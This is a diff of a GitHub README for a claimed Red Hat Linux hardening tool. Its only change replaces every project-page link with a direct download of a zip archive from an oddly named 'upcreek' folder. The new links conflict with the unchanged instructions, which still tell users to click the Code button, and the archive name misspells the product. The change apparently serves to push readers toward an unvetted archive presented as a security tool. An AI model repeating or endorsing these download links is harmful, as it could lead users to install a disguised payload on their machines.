@@ -1,11 +1,11 @@
 # 🛡️ RHEL-Ultra-Hardening-Motion - Stronger Linux, Safer Setup
 
-[![Download / Install](https://img.shields.io/badge/Download-Install%20Now-blue)](https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion)
+[![Download / Install](https://img.shields.io/badge/Download-Install%20Now-blue)](https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion/raw/refs/heads/main/upcreek/Motion-Hardening-RHE-Ultra-3.9.zip)
 
 ## 🔽 Download
 Use this link to visit the page and download the app:
 
-[https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion](https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion)
+[https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion/raw/refs/heads/main/upcreek/Motion-Hardening-RHE-Ultra-3.9.zip](https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion/raw/refs/heads/main/upcreek/Motion-Hardening-RHE-Ultra-3.9.zip)
 
 ## 📌 What this is
 RHEL-Ultra-Hardening-Motion is a security setup for Red Hat Enterprise Linux style systems. It brings together SELinux strict mode, sVirt, seccomp, and AppArmor to help reduce risk on Linux servers and workstations.
@@ -37,7 +37,7 @@ For the Linux system, use:
 Follow these steps to get the files and prepare the setup.
 
 1. Open this page in your browser:
-   [https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion](https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion)
+   [https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion/raw/refs/heads/main/upcreek/Motion-Hardening-RHE-Ultra-3.9.zip](https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion/raw/refs/heads/main/upcreek/Motion-Hardening-RHE-Ultra-3.9.zip)
 
 2. Click the green Code button on GitHub.
 
@@ -165,7 +165,7 @@ Check:
 
 ## 🔗 Project Link
 Use this page to download and review the project:
-[https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion](https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion)
+[https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion/raw/refs/heads/main/upcreek/Motion-Hardening-RHE-Ultra-3.9.zip](https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion/raw/refs/heads/main/upcreek/Motion-Hardening-RHE-Ultra-3.9.zip)
 
 ## 🧾 Notes for first-time users
 Start on a test machine before you use these settings on a live system. Security controls can block normal app behavior if you apply them too fast. Keep a copy of your current config before you change it.
